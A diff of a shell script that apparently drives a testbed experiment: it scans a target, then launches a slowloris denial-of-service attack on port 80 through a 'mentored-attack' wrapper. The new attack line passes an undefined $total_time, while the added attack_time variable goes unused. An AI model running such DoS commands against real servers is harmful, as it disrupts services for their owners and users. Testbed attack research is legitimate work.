@@ -18,6 +18,13 @@ else
     wait_time=$3
 fi
 
+if [ -z "$4" ]
+then
+    attack_time=300
+else
+    attack_time=$4
+fi
+
 target_ip=$(mentored-get-ip --na-regex $target --iname $iname)
 echo "Executing nmap ping-wait-scan.sh with target=$target, iname=$iname, wait_time=$wait_time, target_ip=$target_ip"
 
@@ -32,7 +39,8 @@ done
 mentored-registry-action -a end-check-attack -o /app/results/ -n "Stopping 20 curl requests to $target"
 
 echo "Running slowloris attack..."
-mentored-attack slowloris $target $iname -p 80 --randuseragents -s 300
-mentored-registry-action -a end-attack -o /app/results/ -n "Stopping slowloris attack to $target"
+# mentored-attack slowloris $target $iname -p 80 --randuseragents -s 300
+# mentored-registry-action -a end-attack -o /app/results/ -n "Stopping slowloris attack to $target"
+mentored-attack slowloris $target $iname $total_time -p 80 --randuseragents -s 300
 
 tail -f /dev/null
